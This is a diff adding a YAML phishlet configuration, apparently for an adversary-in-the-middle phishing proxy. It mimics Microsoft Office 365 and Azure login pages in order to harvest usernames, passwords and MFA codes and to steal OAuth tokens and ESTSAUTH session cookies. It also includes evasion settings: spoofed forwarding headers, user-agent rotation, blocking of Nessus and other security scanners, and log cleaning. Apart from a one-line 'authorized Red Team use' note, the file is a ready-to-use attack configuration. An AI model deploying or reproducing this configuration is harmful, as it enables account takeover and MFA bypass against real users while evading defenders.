@@ -1,0 +1,157 @@
+# Advanced Office 365 Phishlet - Red Team Edition
+# Removes safety limitations for professional operations
+
+name: "Advanced Office 365"
+description: "Professional Office 365 phishing with session hijacking and MFA bypass"
+author: "Vantablack Red Team"
+version: "2.0"
+
+# Target configuration
+login:
+  domain: "login.microsoftonline.com"
+  path: "/common/oauth2/authorize"
+  method: "POST"
+
+# Proxy hosts configuration
+proxy_hosts:
+  - phish_sub: "login"
+    orig_sub: "login"
+    domain: "microsoftonline.com"
+  - phish_sub: "www"
+    orig_sub: "www"
+    domain: "office.com"
+  - phish_sub: "outlook"
+    orig_sub: "outlook"
+    domain: "office365.com"
+
+# Target domains for advanced attacks (whitelist)
+target_domains:
+  - "login.microsoftonline.com"
+  - "www.office.com"
+  - "outlook.office365.com"
+  - "portal.azure.com"
+  - "account.activedirectory.windowsazure.com"
+
+# Credential capture configuration
+credentials:
+  username:
+    key: "login"
+    type: "post"
+    search: []
+  password:
+    key: "passwd"
+    type: "post"
+    search: []
+  email:
+    key: "Email"
+    type: "post"
+    search: []
+  mfa_code:
+    key: "otc"
+    type: "post"
+    search: []
+
+# Authentication tokens to capture
+auth_tokens:
+  - "access_token"
+  - "refresh_token"
+  - "id_token"
+  - "session_state"
+
+# Advanced content filtering for session manipulation
+sub_filters:
+  - search: "https://login.microsoftonline.com"
+    replace: "{hostname}"
+    mimes: ["text/html", "application/javascript"]
+  - search: "https://www.office.com"
+    replace: "{hostname}"
+    mimes: ["text/html", "application/javascript"]
+  - search: "login.microsoftonline.com"
+    replace: "{hostname}"
+    mimes: ["text/html", "application/javascript"]
+
+# Session cookie patterns to capture
+session_cookies:
+  - "ESTSAUTH"
+  - "ESTSASC"
+  - "ESTSAUTHLIGHT"
+  - "ESTSAUTHPERSISTENT"
+  - "x-ms-gateway-slice"
+  - "fpc"
+  - "buid"
+
+# MFA bypass patterns
+mfa_patterns:
+  sms:
+    - "\\b\\d{6}\\b"
+    - "code.*[:=]\\s*([0-9]{6})"
+    - "verification.*[:=]\\s*([0-9]{6})"
+  email:
+    - "security code.*[:=]\\s*([0-9]{6})"
+    - "use the following code.*[:=]\\s*([0-9]{6})"
+
+# Advanced attack settings
+advanced:
+  session_hijacking: true
+  mfa_bypass: true
+  cookie_manipulation: true
+  realtime_capture: true
+  auto_replay: false
+  
+  # Evasion techniques
+  user_agent_rotation: true
+  ip_rotation: false
+  request_delay: "100-2000ms"
+  
+  # JavaScript injection points
+  inject_points:
+    - "before </body>"
+    - "after <head>"
+    
+  # Custom headers for evasion
+  custom_headers:
+    X-Forwarded-For: "random"
+    X-Originating-IP: "random"
+    X-Client-IP: "random"
+
+# Red Team operational settings
+opsec:
+  log_cleaning: true
+  request_filtering: true
+  domain_whitelisting: true
+  
+  # Traffic filtering rules
+  filter_rules:
+    - pattern: "googlebot"
+      action: "block"
+    - pattern: "bingbot"
+      action: "block"
+    - pattern: "securityscan"
+      action: "block"
+    - pattern: "nessus"
+      action: "block"
+
+# Monitoring and alerting
+alerting:
+  telegram:
+    enabled: false
+    bot_token: ""
+    chat_id: ""
+  
+  webhook:
+    enabled: false
+    url: ""
+    
+  # Success criteria
+  success_triggers:
+    - "credentials_captured"
+    - "session_hijacked"
+    - "mfa_bypassed"
+    - "admin_access"
+
+# Metadata for reporting
+metadata:
+  category: "Enterprise"
+  difficulty: "Advanced"
+  risk_level: "High"
+  compliance_notes: "For authorized Red Team use only"
